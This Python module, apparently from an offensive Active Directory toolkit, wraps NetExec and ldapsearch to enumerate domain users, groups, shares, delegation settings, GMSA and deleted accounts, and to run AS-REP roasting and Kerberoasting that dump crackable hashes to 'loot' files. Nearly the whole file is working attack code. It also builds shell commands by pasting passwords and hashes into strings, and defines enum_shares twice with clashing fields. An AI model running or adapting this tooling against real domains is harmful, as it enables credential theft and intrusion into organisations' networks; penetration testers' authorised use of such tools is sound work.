# modules/auth_enum.py

import shutil
from core.helpers import run_command, save_loot
from core.colors import blue, green, yellow, red

def _exec_nxc_ldap(session, flags, outfile=None):
    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH."))
        return

    cmd = f"nxc ldap {session.dc_ip} -u \"{session.username}\""
    if session.hash:
        cmd += f" -p :{session.hash}"
    elif session.password:
        cmd += f" -p '{session.password}'"
    cmd += f" -d {session.domain} {flags}"

    out, err = run_command(cmd)
    print(out.strip() or err.strip())

    if outfile and out:
        parsed_users = []
        lines = out.strip().splitlines()
        for line in lines:
            if line.startswith("LDAP") and len(line.split()) >= 5:
                parts = line.split()
                username = parts[4]
                if username.lower() not in ["administrator", "guest", "krbtgt"]:
                    parsed_users.append(username)
        if parsed_users:
            parsed = "\n".join(sorted(set(parsed_users))) + "\n"
            save_loot(outfile, parsed)

def enum_users(session, save=False):
    print(blue("[*] Extracting domain users via LDAP..."))
    _exec_nxc_ldap(session, "--users", "valid_users.txt" if save else None)

def enum_shares(session, save=False):
    print(blue("[*] Enumerating SMB shares via nxc..."))
    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH."))
        return

    cmd = f"nxc smb {session.target_ip} -u {session.username}"
    if session.hash:
        cmd += f" -H {session.hash}"
    elif session.password:
        cmd += f" -p '{session.password}'"
    cmd += " --shares"

    out, err = run_command(cmd)
    print(out.strip() or err.strip())
    if save and out:
        save_loot(f"smb_shares_{session.target_ip}.txt", out)

def enum_groups(session, save=False):
    print(blue("[*] Enumerating domain groups..."))
    _exec_nxc_ldap(session, "--groups", "groups.txt" if save else None)

def enum_computers(session, save=False):
    print(blue("[*] Enumerating domain computers..."))
    _exec_nxc_ldap(session, "--computers", "computers.txt" if save else None)

def enum_dcs(session, save=False):
    print(blue("[*] Enumerating Domain Controllers..."))
    _exec_nxc_ldap(session, "--dc-list", "dcs.txt" if save else None)

def enum_sid(session, save=False):
    print(blue("[*] Getting domain SID..."))
    _exec_nxc_ldap(session, "--get-sid", "sid.txt" if save else None)

def enum_active_users(session, save=False):
    print(blue("[*] Enumerating active user accounts..."))
    _exec_nxc_ldap(session, "--active-users", "active_users.txt" if save else None)

def enum_trusted_for_delegation(session, save=False):
    print(blue("[*] Enumerating trusted-for-delegation users..."))
    _exec_nxc_ldap(session, "--trusted-for-delegation", "trusted_for_delegation.txt" if save else None)

def enum_find_delegation(session, save=False):
    print(blue("[*] Enumerating delegation relationships..."))
    _exec_nxc_ldap(session, "--find-delegation", "delegations.txt" if save else None)

def enum_password_not_required(session, save=False):
    print(blue("[*] Enumerating users with PASSWD_NOTREQD..."))
    _exec_nxc_ldap(session, "--password-not-required", "passnotreq.txt" if save else None)

def enum_admincount(session, save=False):
    print(blue("[*] Enumerating users with adminCount=1..."))
    _exec_nxc_ldap(session, "--admin-count", "admincount.txt" if save else None)

def enum_gmsa(session, save=False):
    print(blue("[*] Enumerating GMSA accounts..."))
    _exec_nxc_ldap(session, "--gmsa", "gmsa.txt" if save else None)

def enum_asreproast(session, save=False):
    print(blue("[*] Running AS-REP Roasting..."))
    _exec_nxc_ldap(session, "--asreproast asrep_hashes.txt" if save else "--asreproast /dev/null")

def enum_kerberoast(session, save=False):
    print(blue("[*] Running Kerberoasting..."))
    _exec_nxc_ldap(session, "--kerberoasting kerberoast_hashes.txt" if save else "--kerberoasting /dev/null")

def enum_shares(session, save=False):
    print(blue("[*] Enumerating SMB shares via nxc..."))
    if not shutil.which("nxc"):
        print(red("[-] 'nxc' not found in PATH."))
        return

    cmd = f"nxc smb {session.target_ips[0]} -u \"{session.username}\""
    if session.hash:
        cmd += f" -H {session.hash}"
    elif session.password:
        cmd += f" -p '{session.password}'"
    cmd += " --shares"

    out, err = run_command(cmd)
    output = out.strip() or err.strip()
    print(output)

    if save and output:
        save_loot(f"smb_shares_{session.target_ips[0]}.txt", output)

def enum_deleted_users(session, save=False):
    print(blue("[*] Enumerating deleted user accounts via LDAP..."))

    if not shutil.which("ldapsearch"):
        print(red("[-] 'ldapsearch' not found in PATH."))
        return

    base_dn = ",".join([f"DC={x}" for x in session.domain.split(".")])
    cmd = f"ldapsearch -H ldap://{session.dc_ip} -D \"{session.username}@{session.domain}\" -w '{session.password}' -b \"{base_dn}\" " \
          "'(isDeleted=TRUE)' -s sub -o ldif-wrap=no -E '!1.2.840.113556.1.4.417' sAMAccountName distinguishedName description"

    out, err = run_command(cmd)
    output = out.strip() or err.strip()
    print(output)

    if save and output:
        save_loot(f"deleted_users_{session.dc_ip}.txt", output)


